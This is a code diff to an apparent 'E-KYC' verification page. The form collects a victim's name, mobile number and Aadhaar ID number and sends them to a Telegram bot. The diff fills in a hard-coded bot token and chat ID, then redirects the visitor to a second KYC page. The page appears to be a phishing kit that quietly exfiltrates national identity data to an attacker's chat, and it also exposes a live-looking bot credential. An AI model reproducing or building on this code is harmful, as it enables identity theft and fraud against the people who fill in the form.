@@ -287,6 +287,7 @@
             const nameRegex = /^[A-Za-z\s]+$/;  // Only alphabets and spaces
             if (!nameRegex.test(name)) {
                 alert('Please enter a valid name 😊');
+                document.getElementById('loadingSpinner').style.display = 'none';
                 return;
             }
 
@@ -295,6 +296,7 @@
             const mobileRegex = /^[6-9]\d{9}$/;  // Starts with 6-9 and followed by 9 digits
             if (!mobileRegex.test(mobile)) {
                 alert('Please enter a valid 10-digit mobile number 📱');
+                document.getElementById('loadingSpinner').style.display = 'none';
                 return;
             }
 
@@ -303,6 +305,7 @@
             const adharRegex = /^\d{4} \d{4} \d{4}$/;  // 12 digits in 3 groups of 4
             if (!adharRegex.test(adhar)) {
                 alert('Please enter a valid Aadhaar number 🆔');
+                document.getElementById('loadingSpinner').style.display = 'none';
                 return;
             }
 
@@ -311,8 +314,8 @@
             const message = `Name: ${formData.get('name')} 😊\nMobile: ${formData.get('mobile')} 📱\nAadhar: ${formData.get('adhar')} 🆔`;
 
             // Send data to Telegram
-            const botToken = 'YOUR_BOT_API_TOKEN'; // Replace with your bot token
-            const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+            const botToken = '7714806324:AAFOeSPa7CX_wxM1BRnEb1ZCJxpOlVHnhuw'; // Replace with your bot token
+            const chatId = '-1002253043573'; // Replace with your chat ID
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
             // Make an API call to send the data to Telegram
@@ -324,6 +327,9 @@
 
                     // Notify user with success emoji
                     alert('Data Verify successfully! ✅');
+
+                    // Redirect to E-KYC2.HTML
+                    window.location.href = 'E-KYC2.HTML';
                 })
                 .catch(error => {
                     // Hide the loading spinner
